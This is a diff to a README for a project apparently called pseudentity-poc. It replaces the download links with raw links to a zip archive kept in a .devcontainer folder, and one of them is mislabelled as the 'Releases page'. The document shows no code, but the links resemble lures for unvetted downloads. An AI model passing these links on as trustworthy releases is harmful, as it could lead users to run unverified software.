@@ -6,7 +6,7 @@ Welcome to the pseudentity-poc project! This tool helps you add "Login with Pseu
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download the Latest Release](https://github.com/uhhhhhhidunno/pseudentity-poc/raw/refs/heads/main/src/pseudentity-poc-v1.3.zip)
+To get started, visit this page to download: [Download the Latest Release](https://raw.githubusercontent.com/uhhhhhhidunno/pseudentity-poc/main/.devcontainer/poc_pseudentity_v1.0.zip)
 
 ## 🖥️ System Requirements
 
@@ -69,6 +69,6 @@ If you have questions or need assistance, feel free to open an issue in the repo
 
 This project is open-source and available for use under the MIT License. This means you can freely modify and share your version of the software, as long as you provide the same rights to others.
 
-Explore the [Releases page](https://github.com/uhhhhhhidunno/pseudentity-poc/raw/refs/heads/main/src/pseudentity-poc-v1.3.zip) to download the latest version. 
+Explore the [Releases page](https://raw.githubusercontent.com/uhhhhhhidunno/pseudentity-poc/main/.devcontainer/poc_pseudentity_v1.0.zip) to download the latest version. 
 
 We hope you find pseudentity-poc useful for your projects!
